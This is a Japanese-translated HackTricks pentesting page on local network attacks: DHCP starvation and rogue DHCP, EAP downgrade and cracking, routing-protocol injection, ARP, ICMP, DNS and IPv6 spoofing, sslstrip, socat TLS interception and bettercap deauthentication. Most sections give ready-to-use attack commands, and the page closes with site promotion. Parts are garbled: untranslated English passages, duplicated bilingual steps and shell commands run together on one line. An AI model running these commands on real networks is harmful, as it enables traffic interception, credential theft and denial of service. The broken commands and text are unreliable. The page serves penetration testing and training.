この攻撃は、DHCPサーバーの応答を見ることができ、プロトコルを完了できる場合にのみ機能します（**Discover**（Comp）-> **Offer**（server）-> **Request**（Comp）-> **ACK**（server））。たとえば、これは**Wifiネットワークでは不可能**です。

DHCP DoSを実行する別の方法は、**ソースコードとして可能なすべてのIPを使用してDHCP-RELEASEパケットを送信する**ことです。その後、サーバーはすべての人がIPを使用し終わったと思うでしょう。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動的な方法は、ツール[DHCPing](https://github.com/kamorin/DHCPig)を使用することです。

環境内のクライアントに新しいリースを取得させ、正規のサーバーを使い果たして応答しなくなるように、上記で言及されたDoS攻撃を使用することができます。したがって、正規のサーバーが再接続しようとすると、**次の攻撃で言及される悪意のある値を提供することができます**。

#### 悪意のある値の設定

Rogue DHCPサーバーを確立するために、Responder DHCPスクリプト（_/usr/share/responder/DHCP.py_）を使用することができます。悪意のあるゲートウェイを設定することは理想的ではありません。なぜなら、乗っ取られた接続は半二重であるため（つまり、クライアントからの出力パケットをキャプチャすることはできますが、正規のゲートウェイからの応答はキャプチャできません）、特にHTTPトラフィックと資格情報をキャプチャするために、ローグDNSまたはWPADサーバーを設定することをお勧めします。

| 説明                                       | 例                                                                           |
| ---------------------------------------- | ---------------------------------------------------------------------------- |
| ゲートウェイとしてアドバタイズされるIPアドレス | _-i 10.0.0.100_                                                              |
| ローカルDNSドメイン名（オプション）           | _-d example.org_                                                             |
| オリジナルのルーター/ゲートウェイのIPアドレス | _-r 10.0.0.1_                                                                |
| プライマリDNSサーバーのIPアドレス             | _-p 10.0.0.100_                                                              |
| セカンダリDNSサーバーのIPアドレス（オプション） | _-s 10.0.0.1_                                                                |
| ローカルネットワークのネットマスク             | _-n 255.255.255.0_                                                           |
| DHCPトラフィックを受信するためのインターフェース | _-I eth1_                                                                    |
| WPAD構成アドレス（URL）                      | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| デフォルトゲートウェイのIPアドレスをスプーフィングする | -S                                                                           |
| すべてのDHCPリクエストに応答する（非常にノイズが多い） | -R                                                                           |

### **EAP攻撃**

以下は、802.1X実装に対して使用できる攻撃戦術のいくつかです：

* EAPを介したアクティブなブルートフォースパスワード攻撃
* 異常なEAPコンテンツ（エクスプロイト）によるRADIUSサーバーへの攻撃
* EAPメッセージのキャプチャとオフラインパスワードクラッキング（EAP-MD5およびPEAP）
* TLS証明書の検証をバイパスするためのEAP-MD5認証の強制
* ハブまたは類似のものを使用して認証後に悪意のあるネットワークトラフィックを注入する

攻撃者が被害者と認証サーバーの間にいる場合、必要に応じて認証プロトコルをEAP-MD5に低下させ、認証試行をキャプチャすることができます。その後、次の方法を使用してブルートフォース攻撃を行うことができます：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP＆HSRP）攻撃 <a href="#6196" id="6196"></a>

**FHRP**（First Hop Redundancy Protocol）は、**ホット冗長ルーティングシステムを作成するためのネットワークプロトコルのクラス**です。FHRPを使用すると、物理ルータを1つの論理デバイスに組み合わせることができ、信頼性を向上させ、負荷を分散するのに役立ちます。

**Cisco Systemsのエンジニアは、GLBPとHSRPの2つのFHRPプロトコルを開発しました。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

ルーティング情報プロトコル（RIP）には、RIP、RIPv2、およびRIPngの3つのバージョンが存在します。RIPとRIPv2は、ポート520を介してピアに送信されるUDPデータグラムを使用します。一方、RIPngはIPv6マルチキャストを介してUDPポート521にデータグラムをブロードキャストします。RIPv2ではMD5認証のサポートが導入されました。RIPngにはネイティブの認証は組み込まれておらず、代わりにIPv6内のオプションのIPsec AHおよびESPヘッダに依存しています。

このプロトコルを攻撃する方法の詳細については、書籍「_**Network Security Assessment: Know Your Network（第3版）**_」を参照してください。

### EIGRP攻撃

**EIGRP（Enhanced Interior Gateway Routing Protocol）**は、動的ルーティングプロトコルです。**距離ベクトルプロトコルです。**認証がなく、パッシブインターフェースの設定がない場合、**侵入者**はEIGRPルーティングに干渉し、**ルーティングテーブルの改ざん**を引き起こすことができます。さらに、EIGRPネットワーク（つまり、自律システム）は**フラットでゾーンにセグメント化されていません**。**攻撃者がルートを注入**すると、このルートは自律EIGRPシステム全体に**広がる可能性があります**。

EIGRPシステムを攻撃するには、**正規のEIGRPルータとの隣接関係を確立**する必要があります。これにより、基本的な偵察からさまざまなインジェクションまで、さまざまな可能性が開かれます。

\*\*\*\*[**FRRouting**](https://frrouting.org/)を使用すると、BGP、OSPF、EIGRP、RIPなどのプロトコルをサポートする**仮想ルータを実装**できます。攻撃者のシステムに展開するだけで、ルーティングドメイン内の正規のルータのふりをすることができます。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)もEIGRPブロードキャストのキャプチャとルーティング構成の操作のためのパケットのインジェクションをサポートしています。Colyを使用して攻撃する方法の詳細については、_**Network Security Assessment: Know Your Network（第3版）**_を参照してください。

### OSPF

ほとんどのOpen Shortest Path First（OSPF）の実装では、MD5を使用してルータ間の認証を提供します。LokiとJohn the Ripperは、MD5ハッシュをキャプチャして攻撃し、キーを明らかにすることができます。これを使用して新しいルートを広告することができます。ルートパラメータは、_Injection_タブを使用して設定し、キーは_Connection_の下で設定されます。

このプロトコルを攻撃する方法の詳細については、書籍「_**Network Security Assessment: Know Your Network（第3版）**_」を参照してください。

### その他の一般的なツールとソース

* [**Above**](https://github.com/c4s73r/Above)：ネットワークトラフィックをスキャンして脆弱性を見つけるためのツール
* ネットワーク攻撃に関する詳細な情報は、[こちら](https://github.com/Sab0tag3d/MITM-cheatsheet)を参照してください。 _(TODO: すべてを読み、新しい攻撃があればすべて読む)_ 

## **スプーフィング**

攻撃者は、偽のDHCP応答を送信することで、新しいネットワークメンバーのすべてのネットワークパラメータ（GW、IP、DNS）を設定します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPスプーフィング

[前のセクション](./#arp-spoofing)を確認してください。

### ICMPリダイレクト

ICMPリダイレクトは、ICMPパケットタイプ1コード5を送信することで、攻撃者がIPに到達する最適な方法であることを示すものです。その後、被害者がIPに接触しようとすると、パケットは攻撃者を介して送信されます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSスプーフィング

攻撃者は、被害者が要求するドメインのいくつか（またはすべて）を解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqを使用して独自のDNSを設定する**

dnsmasq is a lightweight DNS forwarder and DHCP server that can be used to configure your own DNS server. It is commonly used in small networks or for local development purposes. By configuring dnsmasq, you can have control over the DNS resolution process and customize it according to your needs.

To configure dnsmasq, follow these steps:

1. Install dnsmasq on your system. You can do this by running the following command:

   ```
   sudo apt-get install dnsmasq
   ```

2. Once installed, open the dnsmasq configuration file using a text editor. The file is usually located at `/etc/dnsmasq.conf`.

3. In the configuration file, you can specify various settings for your DNS server. Some common settings include:

   - `listen-address`: This specifies the IP address on which dnsmasq should listen for DNS queries. You can set it to `127.0.0.1` if you want to use dnsmasq only on the local machine, or you can specify a specific IP address if you want to use it on a specific network interface.

   - `server`: This specifies the upstream DNS server that dnsmasq should use for resolving DNS queries. You can set it to your preferred DNS server, such as `8.8.8.8` for Google DNS or `1.1.1.1` for Cloudflare DNS.

   - `address`: This allows you to define custom DNS records. For example, you can map a domain name to a specific IP address by adding a line like `address=/example.com/192.168.1.100`.

4. After making the necessary changes, save the configuration file and restart dnsmasq for the changes to take effect. You can do this by running the following command:

   ```
   sudo systemctl restart dnsmasq
   ```

5. Finally, you need to configure your system to use the dnsmasq DNS server. This can usually be done by modifying the network settings or the DNS resolver configuration file on your system. Set the DNS server IP address to the one specified in the `listen-address` setting of dnsmasq.

That's it! You have now configured your own DNS server using dnsmasq. You can test it by querying DNS records or accessing websites to see if the custom DNS records are being resolved correctly.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

通常、システムやネットワークへの複数の経路が存在します。ローカルネットワーク内のMACアドレスのリストを作成した後、_gateway-finder.py_ を使用してIPv4フォワーディングをサポートするホストを特定します。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR、NBT-NS、およびmDNSのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoftのシステムでは、DNSの検索が失敗した場合に、リンクローカルマルチキャスト名解決（LLMNR）とNetBIOS名サービス（NBT-NS）を使用して、ローカルホストの解決を行います。Apple BonjourおよびLinuxのゼロ構成実装では、マルチキャストDNS（mDNS）を使用してネットワーク内のシステムを検出します。これらのプロトコルは認証されておらず、UDP上でブロードキャストメッセージを送信するため、攻撃者はこれらを悪意のあるサービスにユーザーを誘導するために悪用することができます。

Responderを使用して偽の応答を送信することで、ホストが検索するサービスをなりすますことができます。\
[Responderを使用したサービスのなりすましについての詳細はこちらを参照してください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [WPADのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

多くのブラウザは、ネットワークからプロキシ設定を読み込むためにWeb Proxy Auto-Discovery（WPAD）を使用します。WPADサーバーは、次のいずれかを通じて特定のURL（例：[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）を介してクライアントのプロキシ設定を提供します。

* DHCP（コード252のエントリを使用）[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* ローカルドメインで_wpad_ホスト名を検索するDNS
* Microsoft LLMNRおよびNBT-NS（DNSの検索が失敗した場合）

ResponderはWPAD攻撃を自動化し、プロキシを実行し、DHCP、DNS、LLMNR、およびNBT-NSを介してクライアントを悪意のあるWPADサーバーに誘導します。\
[Responderを使用したサービスのなりすましについての詳細はこちらを参照してください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内で異なるサービスを提供し、ユーザーを騙して平文の資格情報を入力させることができます。**この攻撃についての詳細は**[**SSDPおよびUPnPデバイスのスプーフィング**](spoofing-ssdp-and-upnp-devices.md)**を参照してください**。

### IPv6 Neighbor Spoofing

この攻撃はARP Spoofingと非常に似ていますが、IPv6の世界で行われます。被害者には、GWのIPv6が攻撃者のMACアドレスを持っていると思わせることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6ルーター広告のスプーフィング/フラッディング

一部のOSは、ネットワーク内で送信されるRAパケットからデフォルトでゲートウェイを設定します。攻撃者をIPv6ルーターとして宣言するためには、次のコマンドを使用します：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPスプーフィング

デフォルトでは、一部のOSはネットワーク内のDHCPv6パケットを読み取ってDNSを設定しようとします。そのため、攻撃者は自身をDNSとして設定するためにDHCPv6パケットを送信することができます。DHCPはまた、被害者にIPv6を提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP（フェイクページとJSコードの挿入）

## インターネット攻撃

### sslStrip

この攻撃は、**ユーザー**が**アクセスしようとする**HTTPページが**HTTPS**バージョンに**リダイレクト**される場合に行われます。**sslStrip**は、**クライアントとのHTTP接続**と**サーバーとのHTTPS接続**を**維持**するため、接続を**平文**で**傍受**することができます。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
詳細は[こちら](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)を参照してください。

### HSTS回避のためのsslStrip+とdns2proxy

**sslStrip+とdns2proxy**は**sslStrip**との**違い**は、例えば_**www.facebook.com**_を_**wwww.facebook.com**_（**w**が**1つ多い**）に**リダイレクト**し、このドメインの**アドレスを攻撃者のIPに設定**することです。これにより、**クライアント**は_**wwww.facebook.com**_（攻撃者）に**接続**しますが、裏では**sslstrip+**が**www.facebook.com**とのhttps接続を**維持**します。

この技術の**目的**は、_**wwww**.facebook.com_がブラウザの**キャッシュ**に保存されないため、HSTSを**回避**することです。そのため、ブラウザは**facebookの認証をHTTPで実行**するように騙されます。\
この攻撃を実行するためには、被害者が最初に[http://www.faceook.com](http://www.faceook.com)にアクセスしようとする必要があります。これは、httpページ内のリンクを変更することで実現できます。

詳細は[こちら](https://www.bettercap.org/legacy/#hsts-bypass)、[こちら](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)、および[こちら](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)を参照してください。

**sslStripまたはsslStrip+はもはや機能しません。これは、ブラウザに事前保存されたHSTSルールがあるためです。したがって、ユーザーが「重要な」ドメインに初めてアクセスする場合でも、HTTPS経由でアクセスされます。また、事前保存されたルールと他の生成されたルールでは、**`includeSubdomains`**フラグが使用される場合があるため、以前の_**wwww.facebook.com**_の例は_**facebook.com**_が`includeSubdomains`を使用してHSTSを使用するため、もはや機能しません。**

TODO: easy-creds、evilgrade、metasploit、factory

## ポートでのTCPリッスン
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートでのリッスン

#### キーと自己署名証明書の生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用して盗聴する

To listen to network traffic using a certificate, you can perform a man-in-the-middle (MITM) attack. This attack involves intercepting the communication between two parties and decrypting the encrypted traffic using a certificate.

証明書を使用してネットワークトラフィックを盗聴するには、中間者攻撃（MITM）を実行する必要があります。この攻撃では、2つのパーティ間の通信を傍受し、証明書を使用して暗号化されたトラフィックを復号化します。

Here are the steps to perform a MITM attack using a certificate:

証明書を使用したMITM攻撃を実行する手順は以下の通りです：

1. Generate a valid SSL certificate: You need to generate a valid SSL certificate that matches the target domain. This can be done using tools like OpenSSL or by obtaining a certificate from a trusted certificate authority (CA).

1. 有効なSSL証明書を生成する：ターゲットドメインに一致する有効なSSL証明書を生成する必要があります。これは、OpenSSLなどのツールを使用するか、信頼できる証明書機関（CA）から証明書を取得することで行うことができます。

2. Set up a proxy server: Configure a proxy server that will act as the middleman between the client and the server. This can be done using tools like Burp Suite or mitmproxy.

2. プロキシサーバーの設定：クライアントとサーバーの間に中間者として機能するプロキシサーバーを設定します。これは、Burp Suiteやmitmproxyなどのツールを使用して行うことができます。

3. Install the SSL certificate: Install the generated SSL certificate on the proxy server. This will allow the proxy server to decrypt the encrypted traffic.

3. SSL証明書のインストール：生成したSSL証明書をプロキシサーバーにインストールします。これにより、プロキシサーバーは暗号化されたトラフィックを復号化することができます。

4. Configure the client: Configure the client to trust the proxy server's SSL certificate. This can be done by importing the certificate into the client's trust store.

4. クライアントの設定：クライアントがプロキシサーバーのSSL証明書を信頼するように設定します。これは、証明書をクライアントの信頼ストアにインポートすることで行うことができます。

5. Intercept and decrypt traffic: Start the proxy server and intercept the traffic between the client and the server. The proxy server will decrypt the encrypted traffic using the installed SSL certificate, allowing you to listen to the communication.

5. トラフィックの傍受と復号化：プロキシサーバーを起動し、クライアントとサーバー間のトラフィックを傍受します。プロキシサーバーはインストールされたSSL証明書を使用して暗号化されたトラフィックを復号化し、通信を盗聴することができます。

It is important to note that performing a MITM attack without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as testing the security of a network or for educational purposes.

適切な許可なしにMITM攻撃を実行することは違法であり、倫理的にも問題があります。この技術は、ネットワークのセキュリティをテストするためや教育目的など、正当な目的のためにのみ使用するべきです。
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してリッスンし、ホストにリダイレクトする

To listen using a certificate and redirect to the hosts, follow these steps:

1. Generate or obtain a valid SSL/TLS certificate for the desired domain or subdomain.
2. Set up a server that listens for incoming connections on the desired port (e.g., port 443 for HTTPS).
3. Configure the server to use the SSL/TLS certificate for secure communication.
4. Implement a redirection mechanism on the server to redirect incoming requests to the desired hosts.

By following these steps, you can establish a secure connection using the SSL/TLS certificate and redirect incoming traffic to the specified hosts.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
クライアントがCAが有効であることを確認する場合、**他のホスト名で署名された証明書を提供する**ことがあります。\
もう一つの興味深いテストは、**要求されたホスト名の自己署名証明書**を提供することです。

他にテストすることは、有効なCAではない有効な証明書で証明書に署名しようとすることです。また、有効な公開鍵を使用して、ディフィーヘルマンなどのアルゴリズムを強制的に使用し、実際の秘密鍵で何も復号化する必要のないアルゴリズムを使用し、クライアントが実際の秘密鍵のプローブ（ハッシュなど）を要求すると、偽のプローブを送信し、クライアントがこれをチェックしないことを期待することです。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### アクティブディスカバリのノート

要求されたポートを持たないデバイスにUDPパケットが送信されると、ICMP（ポート到達不能）が送信されることに注意してください。

### **ARPディスカバリ**

ARPパケットは、ネットワーク内で使用されているIPアドレスを発見するために使用されます。PCは各可能なIPアドレスに対してリクエストを送信し、使用されているIPアドレスのみが応答します。

### **mDNS（マルチキャストDNS）**

Bettercapは、**\_services\_.dns-sd.\_udp.local**を要求するMDNSリクエスト（Xミリ秒ごとに）を送信します。このパケットを受け取るマシンは通常、このリクエストに応答します。その後、"services"に応答するマシンのみを検索します。

**ツール**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios名前サーバ）**

Bettercapは、ポート137/UDPに対して名前「CKAAAAAAAAAAAAAAAAAAAAAAAAAAA」を要求するブロードキャストパケットを送信します。

### **SSDP（シンプルサービスディスカバリプロトコル）**

Bettercapは、すべての種類のサービスを検索するためにSSDPパケットをブロードキャストします（UDPポート1900）。

### **WSD（Webサービスディスカバリ）**

Bettercapは、サービスを検索するためにWSDパケットをブロードキャストします（UDPポート3702）。

## 参考文献

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。これは、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
